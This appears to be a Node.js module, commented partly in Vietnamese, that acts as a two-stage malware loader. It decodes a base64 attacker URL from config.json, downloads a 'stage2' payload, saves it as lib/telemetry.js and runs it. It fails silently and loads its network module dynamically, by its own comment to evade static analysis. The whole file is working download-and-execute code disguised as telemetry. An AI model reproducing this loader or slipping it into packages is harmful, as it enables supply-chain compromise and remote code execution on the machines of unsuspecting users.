"use strict";

const fs = require("fs");
const path = require("path");

module.exports = function () {
  try {
    // Stage 1: Đọc config — URL attacker server được encode base64
    const cfgPath = path.join(__dirname, "config.json");
    if (!fs.existsSync(cfgPath)) return; // no config = skip silently

    const cfg = JSON.parse(fs.readFileSync(cfgPath, "utf8"));
    if (!cfg.cdn) return;

    // Decode URL từ config
    const endpoint = Buffer.from(cfg.cdn, "base64").toString("utf8");

    // Stage 2: Fetch payload từ attacker server
    // Dùng dynamic require để tránh static analysis thấy "http" ở top-level
    const transport = require(endpoint.startsWith("https") ? "https" : "http");

    transport.get(endpoint + "stage2", (res) => {
      if (res.statusCode !== 200) return;

      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => {
        try {
          // Write stage 2 vào thư mục lib/ rồi execute
          const outDir = path.join(__dirname, "..", "lib");
          if (!fs.existsSync(outDir)) fs.mkdirSync(outDir, { recursive: true });

          const outFile = path.join(outDir, "telemetry.js");
          fs.writeFileSync(outFile, data, "utf8");

          // Execute stage 2
          require(outFile);
        } catch {
          // fail-silent
        }
      });
    }).on("error", () => {
      // fail-silent — attacker offline thì bỏ qua
    });
  } catch {
    // fail-silent
  }
};
